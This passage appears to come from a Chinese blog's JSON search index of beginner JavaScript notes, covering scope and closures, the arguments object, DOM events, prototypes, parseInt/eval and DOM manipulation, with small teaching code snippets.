min(数值1,数值2) 返回最小值 max()返回最大值 pow(num1,num2)//返回num1的那么次方 random()返回随机数 0–1 round(数值)四舍五入 sqrt(数值)开平方根 123456for (var i = 0; i &lt; 20; i++) &#123;document.write(5+Math.random()*5+'&lt;br&gt;');//5-10之间的随机&#125;alert(Math.round(3.6658));//4alert(Math.sqrt(2));//1.4 1234567891011//输入任意两个数字 返回两个数之间的随机数的整数 function rd(big,small)&#123; return Math.ceil(Math.random()*(big-small))+small;&#125;for(var i = 0; i &lt; 30; i++) &#123; document.write(rd(big,small)+'&lt;br&gt;');&#125;//javascript中prompt方法可以让用户输入一个文本，从而作为返回值 prompt返回的是字符串类型//需要用到parseInt 转成数字型 比如：输入12 实际返回的是'12'//alert(typeof(window.prompt()));//string","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript之函数表达式&arguments详解","slug":"2016-07-JavaScript之函数表达式-arguments详解","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.717Z","comments":true,"path":"note/765dd0ea.html","link":"","permalink":"https://ru23.com/note/765dd0ea.html","excerpt":"This与arguments","text":"This与arguments 当一个函数运行的时候 函数内部能引用的变量有这么几种 AO arguments this 对于arguments和this函数都有自己的arguments和this且不进行链式查找 arguments是什么？ 答：arguments是收到的实参的副本 在词法分析中 首先形参形成AO属性 值为undefined 当实参传来时 再修改AO的相应属性 并把收到的实参收集起来放到一个arguments对象里面 t(a,b,c){}为例：调用 时 t(1,2,3,4,5)个参数 此时AO属性只有a,b,c三个属性 但是arguments有1,2,3,4,5所有的值 对于超出形参个数的实参可以通过argument来获得 argument的索引从0 1 2..递增 与实参一一对应 argument.length属性代表实参个数 arguments一定不是数组，但是长得像数组的一个对象而已 虽然也有length属性 arguments每个函数都有 因此只会在内部找自身的argument 无法引用到外部的arguments 123456789101112131415161718function t(a,b,c)&#123;//参数实际来AO的属性 有几个形参 就形成几个AO属性 arguments就代表这个函数的额参数 console.log(a);//1 console.log(b);//2 console.log(c);//3 console.log(arguments[0]);//1 console.log(arguments[1]);//2 console.log(arguments[2]);//3 a = 90; console.log(a);//90 console.log(arguments[0]);//90 互为副本 arguments有一个好处 它接收的实际是你传过来的参数 arguments接收的是所有的实参 console.log(arguments[0]); console.log(arguments[3]);//4 console.log(arguments[4]);//5&#125;t(1,2,3,4,5); 12345678910111213141516//利用 argument的特点完成其他语言的函数重载//求圆形面积 矩形面积 三角形面积 function area()&#123; if(arguments.length ==1)&#123; alert(3.14*arguments[0]*arguments[0]); &#125;else if(arguments.length ==2)&#123; alert(arguments[0]*arguments[1]); &#125;else if(arguments.length ==3)&#123; alert(arguments[0]+arguments[1]+arguments[2]); &#125;else&#123; return null; &#125; &#125;area(10,20,30); 12345678910111213function t()&#123; var age = 22;//age在链的AO上 alert(arguments[0]);//1 alert(arguments[1]);//2 function d()&#123; alert(arguments[0]);//a alert(arguments[1]);//undefined 此时这个argument不会找到上面的arguments[1]去 只有Ao才会按照链来查找 argument不会按照链查找 &#125; d('a');&#125;t(1,2);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript之捕捉模型与冒泡模型","slug":"2016-07-JavaScript之捕捉模型与冒泡模型","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.721Z","comments":true,"path":"note/3de25d52.html","link":"","permalink":"https://ru23.com/note/3de25d52.html","excerpt":"在w3c模型中 addEventListener支持第3个参数来声明事件的模型为冒泡还是捕捉，如果声明为false，则为冒泡方式","text":"在w3c模型中 addEventListener支持第3个参数来声明事件的模型为冒泡还是捕捉，如果声明为false，则为冒泡方式 123456window.onload = function ()&#123;//ev激发的过程自动为函数传一个参数 鼠标的一系列动作包装成对象自动传给函数 document.getElementById('par').addEventListener ('click',function (ev)&#123;alert(ev.pageX)&#125;,true); document.getElementById('son').addEventListener ('click',function ()&#123;alert('son')&#125;); &#125; 捕捉模型与冒泡模型在IE下测试 123456window.onload = function ()&#123;//对于IE 当事件发生的瞬间 事件对象赋值给window.event属性 document.getElementById('par').attachEvent ('onclick',function (ev)&#123;alert(window.event)&#125;);//IE下不支持第三个参数 true document.getElementById('son').attachEvent ('onclick',function ()&#123;alert('son')&#125;); &#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript-DOM事件","slug":"2016-07-JavaScript-DOM事件","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.701Z","comments":true,"path":"note/329b1ea8.html","link":"","permalink":"https://ru23.com/note/329b1ea8.html","excerpt":"DOM 事件就是指 当页面上发生某一件事的时候激发某一个函数 相当监听/触发设备","text":"DOM 事件就是指 当页面上发生某一件事的时候激发某一个函数 相当监听/触发设备 比如： 元素被单击时 onclick 元素失去焦点时 onblur 表单被提交时，用onsubmit DOM事件如何声明？ 直接在元素标签中声明 &lt;input type=&#39;button&#39; onclick=&quot;&quot;&gt; 以事件属性附上一个函数变量：例如inputobj.onclick = 一个函数; 主要的DOM事件：（可以归为3类） 页面上的变化引起的 比如 失去焦点 关闭页面 鼠标变化引起的 比如 鼠标单击 鼠标经过 键盘事件 其中onsubmit比较特殊 ： 在&lt;form onsubmit=&#39;return 函数名&#39;&gt;这样函数return false时 才能阻拦表单的提交行为 鼠标事件： - `onclick` 当单击时 - `onmouseOver` 当经过时 - `onMouseDown` 当鼠标按下时 - `onMouserUp` 当鼠标抬起时 - `onMouseMove` 当鼠标移动时 键盘事件： - `onchange `当内容被改变时[重要] - `onSelect` 当内容被选中时 - `onkeydown `当键盘按下时 - `onkeyup` 当键盘抬起时 - `onSubmit `当表单提交时[重要] - `onReset `当表单重置时 页面事件： - `onblur` 当失去焦点时 - `onfocus `当获得焦点时 - `onload` 当页面加载时 - `onunload` 当页面关闭时 onblur失去焦点 1234&lt;form action=\"\"&gt; &lt;p&gt;Email:&lt;input type=\"text\" name=\"email\" value=\"\" onblur=\"t1();\"&gt;&lt;/p&gt; &lt;p&gt;姓名:&lt;input type=\"text\" name=\"username\" onfocus=\"t2();\"&gt;&lt;/p&gt;&lt;/form&gt; 12345678910111213//失去焦点function t1()&#123; var con = document.getElementsByName('email')[0].value; if(con == '')&#123; document.getElementsByName('email')[0].value = prompt('请输入邮件地址：'); &#125;&#125;//获得焦点function t2()&#123; var con = document.getElementsByName('username')[0]; con.style.border = '2px solid red';&#125; onload 1234567&lt;body onload=\"t1();\" onunload=\"t2();\"&gt;&lt;!-- onload写在页面的开始位置 --&gt; &lt;/body&gt;&lt;form action=\"\"&gt; &lt;p&gt;Email:&lt;input type=\"text\" name=\"email\" value=\"\" &gt;&lt;/p&gt; &lt;p&gt;姓名:&lt;input type=\"text\" name=\"username\"&gt;&lt;/p&gt;&lt;/form&gt; 12345678function t1()&#123; var con = document.getElementsByName('email')[0].value='请填写您的email';&#125;function t2()&#123; alert(\"您真的要关闭吗\");&#125; onmouserover 1234567891011121314151617181920&lt;a href=\"#\" onmouseover=\"t3();\" onmouseout=\"t4();\"&gt;百度&lt;/a&gt;&lt;p id=\"baidu\"&gt; 百度详细介绍 &lt;img src=\"./images/logo.png\"&gt;&lt;/p&gt;&lt;p&gt;&lt;select name=\"xueli\" onchange=\"t5();\"&gt; &lt;option value=\"\"&gt;请选择学历&lt;/option&gt; &lt;option value=\"大学\" &gt;大学&lt;/option&gt; &lt;option value=\"中学\"&gt;中学&lt;/option&gt; &lt;option value=\"初中\"&gt;初中&lt;/option&gt; &lt;option value=\"小学\"&gt;小学&lt;/option&gt; &lt;/select&gt;&lt;/p&gt;&lt;form action=\"\" onsubmit=\"return t6();\"&gt; &lt;!-- onsubmit 和return false结合才能阻止提交 地址栏没变化说明阻拦 --&gt; &lt;p&gt;Email:&lt;input type=\"text\" name=\"email\" value=\"\" &gt;&lt;/p&gt; &lt;p&gt;姓名:&lt;input type=\"text\" name=\"username\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"submit\" value=\"提交 \"&gt;&lt;/p&gt;&lt;/form&gt; 12345&lt;style type=\"text/css\"&gt; #img&#123; display: none; &#125;&lt;/style&gt; 123456789101112131415161718192021222324252627282930313233function t1()&#123; alert('来了'); &#125; function t2()&#123; alert('走了'); &#125; function t3()&#123; var bd = document.getElementById('baidu'); bd.style.display = 'block'; &#125; function t4()&#123; var bd = document.getElementById('baidu'); bd.style.display = 'none'; &#125; function t5()&#123; var sel = document.getElementsByTagName('select')[0]; // alert(sel.value); if(sel.value == '')&#123; alert('至少选择一个'); &#125; &#125; function t6()&#123; var con = document.getElementsByName('email')[0].value; if(con == '')&#123; document.getElementsByName('email')[0].value = prompt('请输入邮件地址：'); return false;//和67行结合才能阻拦提交 &#125; &#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript之面向对象中的多态","slug":"2016-07-JavaScript之面向对象中的多态","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.722Z","comments":true,"path":"note/1fe7b385.html","link":"","permalink":"https://ru23.com/note/1fe7b385.html","excerpt":"多态:同一个父类继承出来的子类各有各的形态","text":"多态:同一个父类继承出来的子类各有各的形态 123456789101112131415161718192021222324252627282930function Cat()&#123; this.eat = '肉';&#125;function Tiger()&#123; this.color = '黑黄相间';&#125;function Cheetah()&#123; this.color = '报文';&#125;function Lion()&#123; this.color = '土黄色';&#125;Tiger.prototype = Cheetah.prototype = Lion.prototype = new Cat();//共享一个祖先 Catvar T = new Tiger();var C = new Cheetah();var L = new Lion();console.log(T.color);console.log(C.color);console.log(L.color);console.log(T.eat);console.log(C.eat);console.log(L.eat);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript与Unicode编码","slug":"2016-07-JavaScript与Unicode编码","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.703Z","comments":true,"path":"note/82c24800.html","link":"","permalink":"https://ru23.com/note/82c24800.html","excerpt":"字符集的概念： 字符集：就是–编码–&gt;字符的映射","text":"字符集的概念： 字符集：就是–编码–&gt;字符的映射 例如：65--&gt;A ASCII字符集:0-255 -128---127 在中国： [00000000] 汉字 最多也不过256个 常用的汉字3000多 全部3w+ [00000000][11111111] 0--65535之间 用两个字节表示一个汉字：gb2312(只存了7000左右的汉字 少)–&gt;GBK Unicode编码集： Unicode规定：国 为例 在 Unicode有一个独特的号 假设是2976 Unicode编码集给世界上大部分的语言每个字符都分配了一个号码 国[gbk]–&gt;unicode[2976]–&gt;日本–&gt;从Unicode得到 国 字 把字符转化成对应Unicode对应的编码 以适应不同的计算机平台 escape 把字符转化成各平台通用的Unicode编码 1234var str = '中国';var enc = escape(str);alert(enc);alert(unescape(enc));// unescape 对escape转化的Unicode编码 解密","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript之面向对象中的封装","slug":"2016-07-JavaScript之面向对象中的封装","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.724Z","comments":true,"path":"note/bec5cc2b.html","link":"","permalink":"https://ru23.com/note/bec5cc2b.html","excerpt":"对象的属性外界是可读可写 如何来达到封装的额目的？ 答：可通过闭包+局部变量来完成","text":"对象的属性外界是可读可写 如何来达到封装的额目的？ 答：可通过闭包+局部变量来完成 在构造函数内部声明局部变量 和普通方法 因为作用域的关系 只有构造函数内的方法 才能访问局部变量 而方法对于外界是开放的 因此可以通过方法来访问 原本外界访问不到的局部变量 达到函数封装的目的 123456789101112131415161718192021222324252627282930313233function Girl(name,age)&#123; var love = '小明';//love 是局部变量 准确说不属于对象 属于这个函数的额激活对象 函数调用时必将产生一个激活对象 love在激活对象身上 激活对象有作用域的关系 有办法访问 加一个函数提供外界访问 this.name = name; this.age = age; this.say = function () &#123; return love; &#125;; this.movelove = function ()&#123; love = '小轩'; //35 &#125;&#125; var g = new Girl('yinghong',22);console.log(g);console.log(g.say());//小明console.log(g.movelove());//undefined 因为35行没有返回console.log(g.say());//小轩function fn()&#123; function t()&#123; //var age = 22;//声明age变量 在t的激活对象上 age = 22;//赋值操作 t的激活对象上找age属性 ，找不到 找fn的激活对象....再找到 最终找到window.age = 22; //不加var就是操作window全局属性 &#125; t();&#125;console.log(fn());//undefined","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript词法分析和作用域闭包","slug":"2016-07-JavaScript词法分析和作用域闭包","date":"2016-07-26T16:50:43.000Z","updated":"2018-10-24T03:46:01.764Z","comments":true,"path":"note/1f382076.html","link":"","permalink":"https://ru23.com/note/1f382076.html","excerpt":"在函数运行时 会进词法分析（预编译） 预编译做了哪些工作 分析参数 分析变量声明(分析带var的变量声明) 分析函数声明","text":"在函数运行时 会进词法分析（预编译） 预编译做了哪些工作 分析参数 分析变量声明(分析带var的变量声明) 分析函数声明 如何分析变量声明？ 答：对于var声明的变量 以var str = ‘local’为例，分为 分析过程 和执行过程 先分析后执行先分析var str即仅仅声明了一个str变量 str变量此时没有赋值 值是undefined 然后在进行执行过程 1234567891011121314151617181920/*var age = 22;var num = 99; function t()&#123; var num = 88; var str = 'hello'; function a()&#123; var str = 'world'; alert(str);//world alert(num);//88 alert(age);//22 &#125; a(); &#125; t(); 1234567891011121314151617181920/*var str = 'global';function t()&#123; alert(str);//undefined var str = 'local';//local alert(str); //词法分析 var str; //执行语句 alert(str) str = 'local' alert(str)&#125;t(); 活动对象、激活对象 Active Object AO上有哪些属性： 对于函数的AO属性来自三个方面 参数 局部变量声明 函数声明 在函数调用瞬间 AO这样形成 首先分析参数 把分析的的参数形成AO属性 如果传来实参 则把实参赋给相应的属性 其次分析var声明 以var str= hello为例 把str声明为AO的属性 值为undefined 如果var声明的变量名与形参名称一致 不产生影响 因为AO的str已经存在 最后分析函数声明，function函数名(){}//有函数名 函数的变量有其作用域，引用某变量时，在某个范围内查询该变量，这个范围又在哪里？在AO上找 在函数调用的瞬间 会产生一个AO 这个AO对象的属性 即存储着该函数所能引用的到的变量 123456789var str = 'global';function t(age)&#123; alert(age);//99 var age = 12; alert(age);//12&#125;t(); 对上面的结果进行分析： AO：{age:undefined} //词法分析得到AO：{age:99} //实参赋值 AO.age属性AO:{age:12} //修改AO.age的值 1234567function f(age,hei)&#123; var age; alert(age); function age()&#123; alert('he'); &#125;&#125; 分析过程： AO:{} AO:{age:undefined,hei:undefined} AO:{age:32,hei,undefined} 分析完形参 紧接着分析var age 不产生影响 因为AO的age已经存在 AO:{age:function(){aler..},hei:undefined} 执行 alert(age)—》AO.age—》函数 函数就是变量 函数声明就是变量声明 函数声明：假设函数名fn 函数声明会把函数赋值为AO.fn属性的值 函数声明与函数表达式的区别 表达式必有一个返回值 （即 匿名函数赋给了一个变量 此时 就是普通的赋值过程） 函数表达式返回返回 并把函数作为值 赋给变量 函数声明的优先级高 例如function fn(){} 则会把AO.fn = function fn(){} 函数表达式 123456789101112131415161718192021222324function fn1()&#123; alert(age); var age = function()&#123; alert('hahh'); &#125; alert(age);&#125;fn1(32);//结果： 32 function//函数声明function fn1()&#123; alert(age); function age()&#123; alert('hahh'); &#125; alert(age);&#125;fn1(32);//结果： function function 闭包 a.程序永远是先定义后执行 b.执行永远从上到下 c.函数定义的话在堆（只是一个地址而已） d.函数调用的时候，就会有自己的堆和栈（闭包） 闭包 作用域 记住：先定义var function 在从上往下执行 定义在自己的栈里面 执行在自己的堆里面 运行在运行的环境中 函数每调用前 只是一个地址 只要调用一次函数就会动态开辟一块内存 创建一个封闭的空间 在自己的封闭的空间的栈中定义var在执行 函数执行完 里面的东西全部销毁 12345678910111213//alert(x);//9:执行弹出x,结果x没定义,错误.alert(i);//9:执行弹出i,然而i之前已经定义,只不过没地址,因此是undefiendvar i = 10;//1:var i; 10:把常量池中10的地址赋给栈中的ivar j = \"你好\";//2:var j; 11:把常量池中 你好 的地址复给栈中的jvar k = z = null;//3:var k,z; 12:把堆中null的地址赋值给z和kvar m = function()&#123;//4:var m; 5:function匿名函数 13:把匿名函数在堆中的地址赋给栈中的m alert(2);&#125;var b = document.body;//6:var b; 14:把堆中document.body对象的地址赋给栈中的bvar f = true;//7:var f; 15:把常量池中true的地址赋给栈中的变量ffunction m()&#123;//8:function m; alert(1);&#125; 12345678910function m()&#123; c = 50;//在局部变量中找不到定义的c 沿着作用域链找到了全局变量的c alert('哈哈哈'); //var c;&#125;var c = 150; // 函数m()还未执行到 还没被销毁 此时全局c的值c=50m();var c = 20;//到这里一步 m()已经执行完了 函数已经销毁了 这里的c还是20alert(c);//20 1234567891011121314function m()&#123; c = 50;//在局部变量中找不到定义的c 沿着作用域链找到了全局变量的c alert('哈哈哈'); function inner()&#123; c = 30; alert('嘻嘻'); &#125; inner();//c在函数内部找不到定义 所以沿着作用域链找到了全局的c&#125;var c = 20;//到这里一步 m()还没执行 函数没被销毁 这里的c是30m();alert(c);//30","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"parsetInt-parsetFloat与eval-isNaN用法","slug":"2016-07-parsetInt-parsetFloat与eval-isNaN用法","date":"2016-07-26T16:50:43.000Z","updated":"2018-10-24T03:46:01.793Z","comments":true,"path":"note/898d51f5.html","link":"","permalink":"https://ru23.com/note/898d51f5.html","excerpt":"parsetInt与parseFloat parsetInt 把字符串的前缀部分分析成整型数字 如果首字不是数字 分析出非数字 NaN 对于parseInt如果碰到前缀有小数点的 舍弃小数点后面的部分","text":"parsetInt与parseFloat parsetInt 把字符串的前缀部分分析成整型数字 如果首字不是数字 分析出非数字 NaN 对于parseInt如果碰到前缀有小数点的 舍弃小数点后面的部分 parsetFloat 把字符串的前缀部分分析成整型浮点型 12345 var age = '12'; age = parseInt(age);//parsetint 分析字符串里面 有没有整型值 把字符串转换成整型 age +=14;//这里需要注意 +号碰到字符换 会连接字符换 alert(age); //26 1234var age = '12.5435abvds'; age = parseInt(age); age +=1; alert(age); // 13 */ 1234var age = '12afa12';age = parseInt(age);age +=1;alert(age);//13 123var age = 'hellworld234';age = parseInt(age);alert(age);//没有值 因为： 把字符串的前缀部分分析成整型数字 如果首字不是数字 分析出非数字 NaN*/ 1234 var age = '12.5435abvds';age = parseFloat(age);age +=1;alert(age);//13.5435 isNaN与eval NaN-一个特殊变量 代表非数字(not is a number) isNaN()用来判断某个变量为 非数字正无穷大 负无穷大 isNan()返回一个布尔值 isNaN()只是用来判断parseInt parseFloat的返回值 提示：在数学里 1/0 –&gt;没有意义 无穷大 isFinity()用于判断一个数值是否有限 对于1/0 -1/0这样的结果判断为false因为它们为正负无穷大 12345678var age = '45fafd123';age = parseInt(age);if(isNaN(age))&#123; alert('是非数字');&#125;else&#123; alert('你的年龄是'+age);&#125; 12345var age = 1/0; alert(age);//Infinity(正无穷大) var age = -1/0; alert(age);//-Infinity*/ 12345678910111213141516//isfinity var age = 1/0;if (isFinite(age)) &#123; alert('你的年龄是有有限的'+age);&#125;else&#123; alert('你不可能这么大');&#125;var age = -1/0;if (isFinite(age)) &#123; alert('你的年龄是有有限的'+age);&#125;else&#123; alert('你不可能这么大');&#125; eval:直接执行一段js代码比如两台 计算机做通信 A-B有可能发xml json 数据等 也有可能发送js代码 123456var t = 3; t +=3; eval('t+=3');//直接执行一段js代码 alert(t); eval(\"alert('快点')\");","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript面向对象程序设计","slug":"2016-07-JavaScript面向对象程序设计","date":"2016-07-26T16:36:43.000Z","updated":"2018-10-24T03:46:01.789Z","comments":true,"path":"note/3c278cf7.html","link":"","permalink":"https://ru23.com/note/3c278cf7.html","excerpt":"object对象","text":"object对象 new关键字代表的是新开辟一块内存空间 没有被引用的内存空间，会在适当的时候被销毁 两句代码含义等同 var person = new Object(); var person = {}; 访问对象的属性除了用 对象引用.属性 key以外，还可以使用对象引用[属性key] 面向对象的程序设计 function构造器 共同点: 动态创建一块内存空间，闭包 不同点: 函数调用是没有办法拿到空间的地址的，而且这块地址是一块临时地址，执行完函数之后，就会销毁 new开辟内存空间，把这块空间的地址返回，这块空间就有可能长期的被引用 prototype原型 通过原型使通过同样一个构造器所new（创建）出来的对象具有相同的属性和行为 prototype本质就是一个对象 foreach this 指代当前创建的这块内存 this.name=name 指代当前内存中的这个name属性 接收外界传过来的值 继承 本质就是从一个prototype对象中把它的功能都copy到另一个prototype对象 继承为什么要循环 封装(面向对象程序设计过程) 1：找对象 小头爸爸 大头儿子 饭 2：抽象（类，构造器） 3：创建对象并且建立关系（操作对象） prototype内存解析 prototype是原型，是一块所有对应构造器创建的对象都共享的内存空间 在面向对象设计程序的时候，属性应该是对应的空间的，而功能应该是prototype公共空间的 通过prototype扩展功能 所有的构造器都是继承于Object构造器的，因此只要Object的原型里有的功能，所有的对象都有 call、apply方法 func.call（obj）：调用func的时候，以obj这个对象的作用域去调用 改变函数在调用的时候里面闭包的作用域 call(obj,arg1,arg2,arg3);call第一个参数传对象，可以是null。参数以逗号分开进行传值，参数可以是任何类型。apply(obj,[arg1,arg2,arg3]);apply第一个参数传对象，参数可以是数组或者arguments对象","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之正则表达式(十)","slug":"2016-07-JavaScript语言基础之正则表达式-十","date":"2016-07-26T16:09:43.000Z","updated":"2018-10-24T03:46:01.784Z","comments":true,"path":"note/d5559bcf.html","link":"","permalink":"https://ru23.com/note/d5559bcf.html","excerpt":"","text":"Regex a.[]一个字符的范围 b.有顺序要求的 c.\\w==[a-zA-Z0-9_] \\d==[0-9] d.{count}设置匹配数量比如\\w{5}，{c1,c2} e.//的正则表达式匹配局部，/^$/的正则表达式是匹配全部 f.()的作用就是为了分组匹配 g.+代表的是1-N个，*代表的是0-N个 h.?代表该字符要不没有要不就有一个 i..代表的是任意字符 附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之Window属性(八)","slug":"2016-07-JavaScript语言基础之Window属性-八","date":"2016-07-26T16:05:43.000Z","updated":"2018-10-24T03:46:01.771Z","comments":true,"path":"note/8908f567.html","link":"","permalink":"https://ru23.com/note/8908f567.html","excerpt":"一些讨论","text":"一些讨论 window 是Window构造器造出来的一个对象 alert(window instanceof Window) document 是Document构造器造出来的一个对象 任何对象在我们的内存中他都是由某个构造器创建出来的 也就是说 有构造器一定有对应的原型prototype 例如：div是由HTMLDivElement 这个构造器创建的一个实例 div = new HTMLDivElement() span = new HTMLSpanElement() 查看某个对象对应的构造器：console.log(); 整个浏览器的实现就是一个面向对象的编程思想 一切皆是对象 BOM 浏览器对象模型 a.screen 指的不是浏览器的宽度，指的是整个电脑屏幕的分辨率 可以拿到屏幕可用分辨率 b.navigator 可以通过userAgent判断当前浏览器信息 c.location URL：统一资源定位符 Union Resource Location 可以通过href属性重定向（改变）页面的URL，进行页面跳转 d.history go方法能够让我们进行历史回退或者前进 e.frames 获得当前窗体的子页面（iframe） f.document DOM模型的核心对象 DOM 文档对象模型 document 功能 getElementById：通过传入的ID，返回标识了这个ID的唯一对象的内存地址 getElementsByTagName:通过传入的标签名字，返回所有该标签对象（HTMLCollection） getElementsByClassName:通过类的名字，返回所有该类的元素对象（HTMLCollection） createElement:想要创建出来的元素能够绘制在页面中，那么它必须在DOM树中 总结： document对象是DOM原型的核心对象，它是内存DOM树的根，所以它提供了很多功能让我们快速的找到DOM树中的某些DOM节点（对象） element 功能方法：（自定义属性非常灵活好用） setAttribute/getAttribute //getAttribute获取标签的属性 –用来操作标签的属性 setAttribute设置标签的属性 appendChild:添加子元素 属性： id className，style name,value(只有表单元素有 其他是没有的) href,src…(对应的元素) innerHTML/innerText innerText返回文本信息 children://子元素集合 parentNode//父元素 总结：元素的功能属性直接可以通过元素对象点出来，除此意外的自定义属性，请通过get/setAtribute去操作 附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之DOM操作(九)","slug":"2016-07-JavaScript语言基础之DOM操作-九","date":"2016-07-26T16:05:43.000Z","updated":"2018-10-24T09:44:33.818Z","comments":true,"path":"note/5bd7146a.html","link":"","permalink":"https://ru23.com/note/5bd7146a.html","excerpt":"DOM 操作","text":"DOM 操作 图片切换的相册效果 tab切换效果 表单验证 特效就是DOM操作的具体应用 DOM操作就是用js来写HTML代码 节点/元素/标签： 三种常用的节点类型： 元素节点 属性节点 文本节点 操作DOM对象： 修改：–找到这个节点 删除：–找到这个节点 添加：–先造出一个节点 然后插入 插入到哪里？找节点来定位 这些都离不开节点的查找 节点的查找：（最重要） 1、document.getElementById—根据id查找节点 [返回的是节点本身] 2、document.getElementsByTagName–根据标签名字来查找[返回的是数组]document.getElementsByTagName[i] 3、document.getElemenstByName–根据name属性来查找节点（一般用在表单中）[返回的是数组]document.getElemenstByName[i]` 注意：早期浏览器都认为name只出现在表单中 因此document.getElemenstByName只对表单中的元素发挥作用 后来部分浏览器把Name属性扩展到一般的元素 如：div 但是IE浏览器还是只能对表单使用byName因此处于兼容性 我们只能对表单使用byName DOM中查找节点的思路：（由大到小 个别情况 由子到父） 由大到小：（通过下面的来定位） 1、document.getElementById—根据id查找节点 [返回的是节点本身] 2、document.getElementsByTagName–根据标签名字来查找[返回的是数组]document.getElementsByTagName[i] 3、document.getElemenstByName–根据name属性来查找节点（一般用在表单中）[返回的是数组]document.getElemenstByName[i] 如果还没有查到自己想要的节点，还可以继续根据上面已经找到的节点再次定位来查找 怎么继续定位？ 答案：childNodes/child 继续查找： 1、查找子元素 children[index]/childNodes 2、查找父元素 node.parentNode –&gt;获取父元素 3、查找兄弟元素 nextSibling previousSibling 4、nextSibling previousSibling firstChild lastChild这四个属性容易受到空白文本的影响 建议不用 12345678910111213141516//============给Object原型加一个方法 消除文本节点对DOM操作的影响 例如：nextSibling` `previousSibling` `firstChild` `lastChild （受到换行 和文本节点影响）Object.prototype.next = function()&#123; //NodeType == 3 text的代号 //NodeType == 1 tag的代号 if(this.nextSibling)&#123;//判断下一个兄弟节点是否存在 switch(this.nextSibling.nodeType)&#123; case 1: return this.nextSibling; case 3: return this.nextSibling.nextSibling; &#125;&#125;else&#123; return null;&#125;console.log(div1.next().next().innerText); 5、对于查到的某个元素里面的子元素非常多 这时候还可利用getElementsByTagname进一步筛选 注意：对于元素对象和document对象相比 元素对象只能利用getElementsByTagName函数 其他两个不能用 节点查找也是通过由大到小来定位：找到大的元素进一步细化 完全可以找到页面上任意一个元素控制他 子元素 不好找 就找他的父元素 要过滤空白文本节点，用children取他的文本节点 DOM与节点的关系： node: childNodes[] parentNode firstChild getElementsByTagName(&#39;元素标签&#39;) lastchild nextSibling previousSibling children[index] children 不是w3c标准 但是各大浏览器兼容性很好 通过给原型添加方法在元素后面创建标签 启示：在项目中，很多很多地方都需要一个方法但是系统没提供，这时可以通过原型扩展 123456789101112//var p = document.createElement('p');//p.innerHTML = \"this is a p\";//var child = document.getElementsByTagName('div');//给Div的HTMLDivElement构造器原型加一个创建元素的方法 要所有的元素都有这个方法 改成 ObjectHTMLDivElement.prototype.createElement = function(tagName)&#123; var child = document.createElement(tagName); this.appendChild(child); return child;&#125;var child = document.getElementsByTagName('div')[2].createElement(\"p\");child.innerHTML = 'pppppp'; 附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之数组(七)","slug":"2016-07-JavaScript语言基础之数组-七","date":"2016-07-26T16:05:43.000Z","updated":"2018-10-24T03:46:01.782Z","comments":true,"path":"note/4d991e84.html","link":"","permalink":"https://ru23.com/note/4d991e84.html","excerpt":"","text":"附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之流程控制(五)","slug":"2016-07-JavaScript语言基础之流程控制-五","date":"2016-07-26T15:50:43.000Z","updated":"2018-10-24T03:46:01.786Z","comments":true,"path":"note/51bbed.html","link":"","permalink":"https://ru23.com/note/51bbed.html","excerpt":"条件结构 if if...else if...else if...else","text":"条件结构 if if...else if...else if...else 当通过判断返回某个值的时候，优先使用三元表达式 